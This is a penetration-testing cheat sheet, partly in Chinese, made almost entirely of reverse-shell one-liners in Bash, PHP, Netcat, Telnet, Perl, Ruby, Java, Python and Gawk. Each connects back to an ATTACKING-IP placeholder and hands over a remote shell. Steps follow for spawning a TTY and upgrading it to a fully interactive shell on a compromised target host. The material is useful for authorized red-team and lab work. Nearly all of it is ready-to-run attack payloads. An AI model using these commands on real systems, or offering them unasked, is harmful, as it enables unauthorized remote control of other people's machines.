### From  Reverse Shell to Spawning a TTY Shell then Upgrade it

* [<em>Reverse shell</em>](#reverse-shell)
* [Spawning a TTY Shell](#spawning-a-tty-shell)
* [Upgrading TTY Shell](#upgrading-tty-shell)
* [Reference](#reference)

* [ChangeLog](#changelog)
#### *Reverse shell*

***Built-in Bash***

```bash
$ exec /bin/bash 0&0 2>&0
$ 0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196


$ exec 5<>/dev/tcp/ATTACKING-IP/80
$ cat <&5 | while read line; do $line 2>&5 >&5; done  

# or:

$ while read line 0<&5; do $line 2>&5 >&5; done
```

```bash
$ bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```

***PHP Reverse Shell***

```PHP
$ php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

***Netcat Reverse Shell***

```bash
$ nc -e /bin/sh ATTACKING-IP 80

$ /bin/sh | nc ATTACKING-IP 80

$ rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
```

***Telnet Reverse Shell***

```bash
$ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

$ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
```

***Perl Reverse Shell***

```PERL
$ perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

*Perl Windows Reverse Shell*

```BASH
$ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

```BASH
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

***Ruby Reverse Shell***

```RUBY
$ ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

***Java Reverse Shell***

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

***Python Reverse Shell***

```PYTHON
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

***Gawk Reverse Shell***

```SHELL
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```

#### Spawning a TTY Shell

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `perl —e 'exec "/bin/sh";'`
- `perl: exec "/bin/sh";`
- `ruby: exec "/bin/sh"`
- `lua: os.execute('/bin/sh')`
- `exec "/bin/sh"`  From within IRB
- `:!bash` From within vi
- `:set shell=/bin/bash:shell` From with wi

#### Upgrading TTY Shell

1. 升级成 *tty shell*

```bash
[www-data@targethosts]$ python -c 'import pty;pty.spawn("/bin/bash")'
```

2. 在 *shell* 中设置 *term* 类型为 *kali* 的 *term* 类型

```bash
root@kali# echo $TERM
					 xterm-256color
```

```bash
[www-data@targethosts]$ export TERM=xterm-256color
[www-data@targethosts]$ export SHELL=/bin/bash
```

3. 检查 *term* 的 *rows* 和 *columns*

```shell
root@kali# stty size
					 23		80
```

4. 将得到的 *shell* 放在后台运行

```bash
[www-data@targethosts]$ ^Z
												[1]+ Stopped   nc -lvp 449
												
[www-data@targethosts]$ stty raw -echo;fg
```

接着执行 *reset* 命令进行对 *shell* 初始化，并通过 *stty* 设置 *rows* 和 *columns*

```bash
[www-data@targethosts]$ stty raw -echo;fg
												nc -lvp 449
																		reset
																		
[www-data@targethosts]$ stty rows 24 columns 80
```

***tips*** ： 如果出现 `'xterm-256color': unknown terminal type.`，则说明 *targethosts* 不支持该终端，可以改为 `xterm`。



### Reference

- [upgrade-shell-to-fully-interactive-tty-shell/](https://www.metahackers.pro/upgrade-shell-to-fully-interactive-tty-shell/)
- [reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)



### ChangeLog

- 191713 init